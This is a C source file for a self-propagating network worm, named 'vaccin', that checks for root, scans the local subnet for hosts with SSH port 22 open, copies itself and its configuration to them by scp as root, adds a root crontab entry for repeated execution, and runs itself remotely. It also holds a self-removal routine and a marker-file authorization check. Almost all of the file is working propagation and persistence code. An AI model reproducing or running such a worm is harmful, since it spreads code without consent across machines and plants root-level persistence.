#include "../include/vaccin.h"

int isRoot() {
	int ret = RET_FAILURE;
	
	// check if the uid and euid are equals to 0
	if (getuid() == 0 && geteuid() == 0) {
		// syslog message
		writeSyslog("## Launching vaccin by root");
		ret = RET_SUCCESS;
	}
	return ret;
}

int isSourceHost(char *source_host_ip, char *mask_network) {
	int ret = RET_FAILURE;
	char buf[IP_LEN];
	char *server = NULL;
	struct ifaddrs *myaddrs = NULL;
	struct ifaddrs *ifa = NULL;
	struct sockaddr_in *s4 = NULL;
	struct sockaddr_in *mask = NULL;

	// get network interfaces
	ret = getifaddrs(&myaddrs);
	if (ret != 0)
		return RET_FAILURE;

	// get the value for the field "server" from the configuration file
	server = GetConfigServer();
	if (server == NULL)
		return RET_FAILURE;

	ret = RET_FAILURE;
	// for each network interface
	for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {

		// if the interface used TCP/IP
		if (ifa->ifa_addr->sa_family == AF_INET) {
			s4 = (struct sockaddr_in *) (ifa->ifa_addr);

			// if the interface has an ip address configured
			if (inet_ntop(ifa->ifa_addr->sa_family, (void *) &(s4->sin_addr), buf, sizeof(buf)) != NULL) {

				// if the ip address of the interface is equal of the ip address defined in the configuration file
				if (!strcmp(server, buf)) {

					// copy the ip address of the interface
					memset(source_host_ip, 0, IP_LEN);
					strcpy(source_host_ip, buf);
					memset(buf, 0, sizeof(buf));

					// get the subnet mask
					mask = (struct sockaddr_in *) (ifa->ifa_netmask);
					inet_ntop(ifa->ifa_netmask->sa_family, (void *) &(mask->sin_addr), buf, sizeof(buf));
					memset(mask_network, 0, IP_LEN);
					strcpy(mask_network, buf);

					// syslog message
					writeSyslog("## We are the administrator's host");

					ret = RET_SUCCESS;
					break;
				}
				memset(buf, 0, sizeof(buf));
				ret = RET_FAILURE;
			}
		}
	}
	// free dynamic allocations
	free(myaddrs);	

	return ret;
}

struct in_addr* scanNetwork(char* source_host_ip, char* mask_network) {
	struct sockaddr_in sockHostIP;
	unsigned long int nbrComputer, hostMask, i;
	int sock, compteur = 0;
	char nbrComputer_[80];
	struct in_addr mask, broadcast, hostIP, sourceIP, *resultIP = NULL;
	char *msg = NULL;

	// syslog message
	writeSyslog("## Launching network scan");

	// convert the ip address in the Internet dot notation
	inet_aton(source_host_ip, &sourceIP);

	// convert the subnet mask in the Internet dot notation
	inet_aton(mask_network, &mask);

	// convert the broadcast address in the Internet dot notation
	inet_aton(BROADCAST, &broadcast);

	// get the number of hosts for the subnet
	nbrComputer = ntohl(broadcast.s_addr ^ mask.s_addr);
	hostMask = sourceIP.s_addr & mask.s_addr;

	// syslog message
	sprintf(nbrComputer_, "%lu", nbrComputer);
	msg = (char *) malloc(sizeof("## Maximal number of hosts on this network : ") + strlen(nbrComputer_) + 1);
	if (msg != NULL) {
		strcpy(msg, "## Maximal number of hosts on this network : ");
		strcat(msg, nbrComputer_);
		writeSyslog(msg);
		free(msg);
	}

	// for each ip address on the subnet
	for (i = 1; i < nbrComputer; i++) {

		// get the host ip address
		hostIP.s_addr = htonl(ntohl(hostMask) + i);

		// if the host ip address and the ip address defined in the configuration file
		if (strcmp(inet_ntoa(hostIP), source_host_ip) == 0) {

			// syslog message
			msg = (char *) malloc(sizeof("## Host administrator found : ") + strlen(source_host_ip));
			if (msg != NULL) {
				strcpy(msg, "## Host administrator found : ");
				strcat(msg, source_host_ip);
				writeSyslog(msg);
				free(msg);
			}
			continue;
		}

		// try to connect the host on port 22
		bzero(&sockHostIP, sizeof(sockHostIP));
		sock = socket(AF_INET, SOCK_STREAM, 0);
		sockHostIP.sin_family = AF_INET;
		sockHostIP.sin_port = htons(PORT);
		sockHostIP.sin_addr = hostIP;

		// if the port 22 is open
		if (connect(sock, (struct sockaddr *) & sockHostIP, sizeof(sockHostIP)) == 0) {

			// add the host ip address in the list of avaiable hosts
			resultIP = (struct in_addr *) realloc(resultIP, (compteur + 1) * sizeof(struct in_addr));
			resultIP[compteur] = hostIP;
			compteur++;

			// syslog message
			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + sizeof(" tested and ssh port is open") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested and ssh port is open");
				writeSyslog(msg);
				free(msg);
			}
		}
		else { // the port 22 is close

			// syslog message
			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + sizeof(" tested") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested");
				writeSyslog(msg);
				free(msg);
			}
			continue;
		}
	}
	return resultIP;
}

int isAlreadyColonize(char *host, char *program) {
	int ret = RET_FAILURE;
	char command[4096];
	char *program_path = NULL;

	// init
	program_path = (char *) malloc(strlen(program) + strlen(CLIENT_PATH) + 1);
	if (program_path == NULL)
		return ret;

	// concat the remote path for the program with the program name
	strcpy(program_path, CLIENT_PATH);
	strcat(program_path, program);
	sprintf(command, "%s -p %d %s \"test -f %s\"", SSH, PORT, host, program_path);
	free(program_path);

	// test if the program exists on the remote host
	ret = system(command);
	
	if (ret == 0)
		return RET_SUCCESS;
	return RET_FAILURE;
}

int colonize(char *host, char *file) {
	int ret = RET_FAILURE;
	char command[4096];
	char *msg = NULL;
	char *dir = NULL;
	char *config = NULL;
	char *file_path = NULL;

	// if scp and ssh programs do not exist
	if (access(SCP, R_OK) != 0 || access(SSH, R_OK) != 0)
		return ret;

	// get the directory of the program
	dir = (char *) malloc(strlen(file));
	if (dir == NULL)
		return ret;
	strcpy(dir, file);
	dirname(dir);

	// get the path of the configuration file
	config = (char *) malloc(strlen(dir) + strlen(CONFIG_FILE) + 2);
	if (config == NULL)
		return ret;
	strcpy(config, dir);
	strcat(config, "/");
	strcat(config, CONFIG_FILE);

	// get remote program path
	file_path = (char *) malloc(strlen(CLIENT_PATH) + strlen(basename(file)) + 1);
	if (file_path == NULL)
		return ret;
	strcpy(file_path, CLIENT_PATH);
	strcat(file_path, basename(file));

	// if the program and the configuration file are not avaiable
	if (access(file, R_OK) != 0 || access(config, R_OK) != 0) {
		free(dir);
		free(config);
		return ret;
	}

	// syslog message
	msg = (char *) malloc(sizeof("## colonization of ") + strlen(host) + 1);
	if (msg != NULL) {
		strcpy(msg, "## colonization of ");
		strcat(msg, host);
		writeSyslog(msg);
		free(msg);
	}

	// copy the program on the remote host
	sprintf(command, "%s -P %d %s root@%s:%s", SCP, PORT, file, host, CLIENT_PATH);
	ret = system(command);

	// if the command succeeded
	if (ret == 0 ) {
		// syslog message
		msg = (char *) malloc(sizeof("## worm copy on %s") + strlen(host) + 1);
		if (msg != NULL) {
			strcpy(msg, "## worm copy on ");
			strcat(msg, host);
			writeSyslog(msg);
			free(msg);
		}

		// copy the configuration file on the remote host
		memset(command, 0, 4096);
		sprintf(command, "%s -P %d %s root@%s:%s", SCP, PORT, config, host, CLIENT_PATH);
		ret = system(command);

		// if the command succeeded
		if (ret == 0) {
			// update the root crontab on the remote host
			memset(command, 0, 4096);
			sprintf(command, "%s -p %d root@%s \" echo 0 \\* \\* \\* \\* %s >> %s \"", SSH, PORT, host, file_path, CRONTAB);
			ret = system(command);

			// if the command succeeded
			if (ret == 0) {
				// syslog message
				msg = (char *) malloc(sizeof("## Automatic launch configuration for %s") + strlen(host) + 1);
				if (msg != NULL) {
					strcpy(msg, "## Automatic launch configuration for ");
					strcat(msg, host);
					writeSyslog(msg);
					free(msg);
				}

				// launch remote program
				memset(command, 0, 4096);
				sprintf(command, "%s -p %d root@%s \"%s\"", SSH, PORT, host, file_path);
				ret = system(command);
				
				// if the command succeeded
				if (ret == 0 || ret == 256) {
					msg = (char *) malloc(sizeof("## First worm execution on ") + strlen(host) + 1);
					if (msg != NULL) {
						strcpy(msg, "## First worm execution on ");
						strcat(msg, host);
						writeSyslog(msg);
						free(msg);
					}
					ret = RET_SUCCESS;
				}
			}
		}
	}

	// free dynamic allocations
	free(dir);
	free(config);
	free(file_path);

	if (ret != RET_SUCCESS)
		ret = RET_FAILURE;
	return ret;
}

int isAuthorized(char *marker) {
	if (access(marker, R_OK) == 0) {
		writeSyslog("## Vaccin is authorized on this host");
		return RET_SUCCESS;
	}
	else {
		writeSyslog("## Vaccin is not authorized on this host");
		return RET_FAILURE;
	}
}

int wormDelete(char *file) {
	int ret = RET_FAILURE;
	char command[4096];
	char *msg = NULL;
	char *program = NULL;
	char *config = NULL;

	// get the program path
	program = (char *) malloc(strlen(CLIENT_PATH) + strlen(basename(file)) + 1);
	if (program == NULL)
		return ret;
	strcpy(program, CLIENT_PATH);
	strcat(program, basename(file));

	// get the configuration file path
	config = (char *) malloc(strlen(CLIENT_PATH) + strlen(CONFIG_FILE) + 1);
	if (config == NULL)
		return ret;
	strcpy(config, CLIENT_PATH);
	strcat(config, CONFIG_FILE);

	// restore root crontab
	memset(command, 0, 4096);
	sprintf(command, "if test -f %s ; then cat %s | grep -v %s > %s ; fi", CRONTAB, CRONTAB, file, CRONTAB);
	ret = system(command);
	
	// syslog message
	writeSyslog("## Delete automatic launch configuration");

	// delete the program
	memset(command, 0, 4096);
	sprintf(command, "if test -f %s; then rm %s ; fi", program, program);
	ret = system(command);

	// syslog message
	msg = (char *) malloc(sizeof("## Delete vaccin file : ") + strlen(program) + 1);
	if (msg != NULL) {
		strcpy(msg, "## Delete vaccin file : ");
		strcat(msg, program);
		writeSyslog(msg);
		free(msg);
	}

	// delete the configuration file
	memset(command, 0, 4096);
	sprintf(command, "if test -f %s; then rm %s ; fi", config, config);
	ret = system(command);
	
	// syslog message
	msg = (char *) malloc(sizeof("## Delete vaccin configuration file : ") + strlen(config));
	if (msg != NULL) {
		strcpy(msg, "## Delete vaccin configuration file : ");
		strcat(msg, config);
		writeSyslog(msg);
		free(msg);
	}
	ret = RET_SUCCESS;
	writeSyslog("## Successfully deletion of vaccin");

	// free dynamic allocations
	free(program);
	free(config);

	return ret;
}
